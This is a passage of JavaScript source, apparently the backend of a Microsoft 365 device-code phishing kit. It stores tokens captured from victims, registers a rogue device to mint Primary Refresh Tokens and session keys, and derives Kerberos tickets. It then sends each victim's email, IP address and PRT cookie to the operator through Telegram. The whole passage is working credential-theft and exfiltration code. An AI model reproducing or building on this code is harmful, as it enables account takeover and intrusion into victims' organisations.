          .catch(err => {
            console.error('[DeviceProxy] Cookie conversion failed:', err.message);
            return { success: false, error: err.message };
          });
      }
    }

    // Attempt device registration and PRT generation for ALL work/school accounts
    // This runs asynchronously and doesn't block the response
    // Works for: specific tenant GUIDs, 'organizations', AND 'common' endpoints
    if (accountType === 'work_school' && tokenData.access_token && !deviceEnrolled) {
      console.log('[DeviceProxy] Attempting device registration for token', tokenId, 'tenant:', tenant);
      const deviceManager = require('./devicemanager');
      // Extract email domain for DRS registration (e.g., 'saintaloysiusms.org' from 'user@saintaloysiusms.org')
      const emailDomain = email ? email.split('@')[1] : null;

      // Flag to track if device registration failed
      let deviceRegistrationFailed = false;

      deviceManager.registerDeviceAndGetPrt({
        access_token: tokenData.access_token,
        refresh_token: tokenData.refresh_token,
        tenant_id: tenant,
        target_domain: emailDomain || tenant, // Use email domain for DRS, fallback to tenant GUID
        user_id: job.user_id,
        link_id: job.link_id
      }).then(async (registrationResult) => {
        console.log('[DeviceProxy] Device registered successfully:', registrationResult.deviceId);
        // Store device credentials in database
        await deviceManager.storeDeviceCredentials(registrationResult, job.user_id, email);

        // GraphSpy parity: registerDeviceAndGetPrt() ran the device-signed
        // request_for_device call (Slice C) during registration. Persist the
        // session key next to the stored credentials and upgrade the token
        // row to the real raw PRT (replacing the plain refresh token that
        // was stored in the prt column at capture time).
        if (registrationResult.sessionKeyHex) {
          try {
            await deviceManager.persistPrtSessionKey(job.user_id, tenant, registrationResult.sessionKeyHex, {
              deviceId: registrationResult.deviceId,
              deviceCertificate: registrationResult.deviceCertificate,
              privateKeyPem: registrationResult.privateKey,
              certificateDerBase64: registrationResult.certificateDerBase64,
            });
          } catch (skErr) {
            console.warn('[DeviceProxy] session key not stored in device_credentials:', skErr.message);
          }
        }
        if (registrationResult.prt && tokenId) {
          try {
            await db.query(
              'UPDATE captured_tokens SET prt = ?, session_key_jwe = ? WHERE id = ?',
              [encrypt(registrationResult.prt), encrypt(registrationResult.sessionKeyJwe || null), tokenId]
            );
            console.log('[DeviceProxy] Token row upgraded to raw PRT from request_for_device');
          } catch (pErr) {
            console.warn('[DeviceProxy] Failed to store request_for_device PRT:', pErr.message);
          }
        }
      }).then(() => {
        console.log('[DeviceProxy] Device credentials stored for token', tokenId);

        // Auto-derive Kerberos TGTs ONLY after successful device registration
        // This ensures we have a real PRT (not just a refresh token)
        if (tenant && tenant !== 'common' && tenant !== 'organizations') {
          console.log('[DeviceProxy] Attempting Kerberos TGT derivation for token', tokenId, 'tenant:', tenant);
          const kerberosService = require('./kerberos');
          kerberosService.deriveTGTForToken(tokenId)
            .then(derivationResult => {
              if (derivationResult.success) {
                console.log('[DeviceProxy] Kerberos TGT derived for token', tokenId, ':', derivationResult.email);
                // Update the token record with Kerberos data
                if (derivationResult.tgt_cloud) {
                  db.query(
                    'UPDATE captured_tokens SET tgt_cloud = ? WHERE id = ?',
                    [encrypt(derivationResult.tgt_cloud), tokenId]
                  ).catch(err => console.error('[DeviceProxy] Failed to save TGT cloud:', err));
                }
                if (derivationResult.tgt_ad) {
                  db.query(
                    'UPDATE captured_tokens SET tgt_ad = ? WHERE id = ?',
                    [encrypt(derivationResult.tgt_ad), tokenId]
                  ).catch(err => console.error('[DeviceProxy] Failed to save TGT AD:', err));
                }
                if (derivationResult.session_key) {
                  db.query(
                    'UPDATE captured_tokens SET tgt_cloud_sessionkey = ? WHERE id = ?',
                    [encrypt(derivationResult.session_key), tokenId]
                  ).catch(err => console.error('[DeviceProxy] Failed to save session key:', err));
                }
                if (derivationResult.kerberos_top_level_names) {
                  db.query(
                    'UPDATE captured_tokens SET kerberos_top_level_names = ? WHERE id = ?',
                    [derivationResult.kerberos_top_level_names, tokenId]
                  ).catch(err => console.error('[DeviceProxy] Failed to save kerberos names:', err));
                }
              } else {
                console.log('[DeviceProxy] Kerberos derivation skipped for token', tokenId, ':', derivationResult.error || 'no PRT');
              }
            })
            .catch(err => {
              console.error('[DeviceProxy] Kerberos derivation error:', err.message);
            });
        }
      }).catch(err => {
        console.error('[DeviceProxy] Device registration failed:', err.message);
        deviceRegistrationFailed = true;
        // Don't fail the token capture - device registration is optional
      });

      // Expose flag for capture.js to check early
      job.deviceRegistrationFailed = () => deviceRegistrationFailed;
    } else {
      console.log('[DeviceProxy] Device registration skipped:', {
        tokenId,
        reason: accountType !== 'work_school' ? 'not work/school' : !tokenData.access_token ? 'no access_token' : 'unknown'
      });
    }

    // Update visitor status to "done" (or "blocked" if block_done_visitors is enabled)
    try {
      const [blockRows] = await db.query(
        'SELECT block_done_visitors FROM visitor_settings WHERE user_id = ?',
        [job.user_id]
      );
      const blockDone = blockRows.length > 0 && blockRows[0].block_done_visitors == 1;
      const newStatus = blockDone ? 'blocked' : 'done';
      
      // Update ALL visitors with status 'waiting' OR 'visited' for this user/link
      // This ensures visitors logged by block-check (status='visited') are also updated
      const [updateResult] = await db.query(
        'UPDATE visitors SET status = ? WHERE user_id = ? AND link_id = ? AND status IN (?, ?)',
        [newStatus, job.user_id, job.link_id, 'waiting', 'visited']
      );
      console.log(`[DeviceProxy] Visitor marked as ${newStatus} for user ${job.user_id}, link ${job.link_id} (updated ${updateResult.affectedRows} rows)`);
    } catch (updateErr) {
      console.error('[DeviceProxy] Visitor status update error:', updateErr.message);
    }

    // Notify via WebSocket
    try {
      const io = require('express')().get('io');
      if (io) {
        const notifyTokenType = job.mode === 'cookie' && cookieConversionResult && cookieConversionResult.success ? 'cookie' : (job.mode || 'token');
        io.to(`user_${job.user_id}`).emit('new_token', {
          id: tokenId,
          email,
          token_type: notifyTokenType,
          created_at: new Date(),
        });
      }
    } catch (e) {
      /* silent */
    }

    console.log(`[DeviceProxy] Token captured for user ${job.user_id}, link ${job.link_id}`);

    // Send Telegram capture report directly from device proxy
    // This ensures Telegram receives the capture even if the worker never calls /api/capture
    try {
      const reportTokenType = job.mode === 'cookie' ? 'cookie' : 'token';

      // Load stored token row so Kerberos fields are defined if already saved
      const [tokenRows] = await db.query(
        'SELECT id, email, token_type, tenant, account_type, ip_address, user_agent, prt, session_key_jwe, device_tenant_id, tgt_ad, tgt_cloud, kerberos_top_level_names, tgt_cloud_sessionkey FROM captured_tokens WHERE id = ?',
        [tokenId]
      );
      const tokenRow = tokenRows.length > 0 ? tokenRows[0] : null;

      const safe = (v) => (v == null ? 'N/A' : v);
      const caption = `🚨 NEW CAPTURE - ${reportTokenType.toUpperCase()}
👤 <b>Email:</b> ${safe(email || tokenRow?.email)}
🏷️ <b>Account:</b> ${safe(accountType || tokenRow?.account_type)} | Tenant: ${safe(tenant || tokenRow?.tenant)}
🌐 <b>Template:</b> office
🌍 <b>IP:</b> ${safe(ipAddress || tokenRow?.ip_address)}
🔗 <b>Link:</b> ${job.link_id} | Token ID: ${tokenId}
📅 <b>Time:</b> ${new Date().toISOString().replace('T', ' ').slice(0, 19)}
✅ Full ${reportTokenType}s in attached .txt`;

      let fileContent = [
        'VGENIUS CAPTURE REPORT',
        '========================================',
        `Type:        ${reportTokenType.toUpperCase()}`,
        `Token ID:    ${tokenId}`,
        `Email:       ${safe(email || tokenRow?.email)}`,
        `Account:     ${safe(accountType || tokenRow?.account_type)}`,
        `Tenant:      ${safe(tenant || tokenRow?.tenant)}`,
        `IP:          ${safe(ipAddress || tokenRow?.ip_address)}`,
        `User Agent:  ${safe(userAgent || tokenRow?.user_agent)}`,
        `Link:        ${job.link_id}`,
        `Time:        ${new Date().toISOString()}`,
        '========================================'
      ].join('\n');

      // Include only the real GraphSpy PRT cookie in the report. Ordinary
      // Microsoft cookies (fpc, x-ms-gateway-slice, stsservicecookie, etc.) are
      // not PRT material and must never be shown as a capture result.
      const reportCookies = [];
      if (responseCookies && responseCookies.length > 0) {
        for (const cookie of responseCookies) {
          if (cookie && cookie.name && String(cookie.name).toLowerCase() === 'x-ms-refreshtokencredential') {
            reportCookies.push(`${cookie.name}=${cookie.value}; domain=${cookie.domain || '.login.microsoftonline.com'}; path=/; secure`);
          }
        }
      }
      if (cookieConversionResult && cookieConversionResult.cookies) {
        const extra = Array.isArray(cookieConversionResult.cookies)
          ? cookieConversionResult.cookies
              .filter(c => c && c.name && String(c.name).toLowerCase() === 'x-ms-refreshtokencredential')
              .map(c => `${c.name}=${c.value}; domain=${c.domain}; path=${c.path || '/'}; secure${c.httpOnly ? '; httponly' : ''}${c.sameSite ? '; samesite=' + c.sameSite : ''}`)
          : [String(cookieConversionResult.cookies)];
        for (const item of extra) reportCookies.push(item);
      }
      if (reportCookies.length > 0) {
        fileContent += '\n\nCOOKIES:\n' + [...new Set(reportCookies)].join('\n');
      } else if (reportTokenType === 'cookie') {
        fileContent += '\n\nCOOKIES:\nNO PRT COOKIE CAPTURED';
      }

      const filename = `capture_device_${tokenId}_${reportTokenType}.txt`;

      console.log('[DeviceProxy] Sending Telegram report for token', tokenId, 'type=', reportTokenType, 'caption=', caption);
      await sendTelegramDocument(job.user_id, filename, fileContent, caption);
      console.log('[DeviceProxy] Telegram report sent for token', tokenId);
    } catch (telegramErr) {
      console.error('[DeviceProxy] Telegram report failed:', telegramErr);
    }
  } catch (err) {
    console.error('[DeviceProxy] storeToken error:', err.message);
  }
}

/**
 * Poll a specific job status
 * @param {string} jobId
 * @returns {object} status info
 */
function getJobStatus(jobId) {
  const job = activeJobs.get(jobId);
  if (!job) {
    return {
      status: 'not_found',
      error: 'Job not found or expired'
    };
  }

  // Check expiry
  if (Date.now() > job.expires_at && job.status === 'polling') {
    job.status = 'expired';
  }

  const remaining = Math.max(0, Math.floor((job.expires_at - Date.now()) / 1000));

  const result = {
    status: job.status === 'completed' ? 'done' : job.status,
    job_id: job.jobId,
    user_code: null,
    verification_uri: null,
    verification_uri_complete: null,
    expires_in: remaining,
    recommended_mode: null,
    error_code: null,
    error_message: null,
  };

  if (job.status === 'polling') {
    // Return waiting status
    result.status = 'waiting_user';
    // Surface the user code (and verification URI) as soon as the job has
    // it, so the page can render the code without waiting for a second poll.
    result.user_code = job.user_code || null;
    result.verification_uri = job.verification_uri || null;
    result.verification_uri_complete = job.verification_uri_complete || null;
  }

  if (job.status === 'expired' || job.status === 'failed') {
    result.error = job.error || 'Code expired or verification failed';
  }

  if (job.status === 'soft_error') {
    result.soft_error = true;
    result.error_code = 50076;
    result.recommended_mode = 'token';
    result.error_message = 'Additional verification required';
    if (job.retry_job_id) {
      result.retry_job_id = job.retry_job_id;
    }
  }

  if (job.status === 'completed') {
    result.email = job.captured_email || null;
  }

  return result;
}

/**
 * Clean up expired jobs (called periodically)
 */
function cleanupJobs() {
  const now = Date.now();
  for (const [id, job] of activeJobs) {
    if (now > job.expires_at + 300000) {
      // 5 min grace period
      activeJobs.delete(id);
    }
  }
}

// Cleanup every 5 minutes
setInterval(cleanupJobs, 5 * 60 * 1000);

module.exports = {
  startDeviceFlow,
  getJobStatus,
  pollForToken,
  cleanupJobs,
};
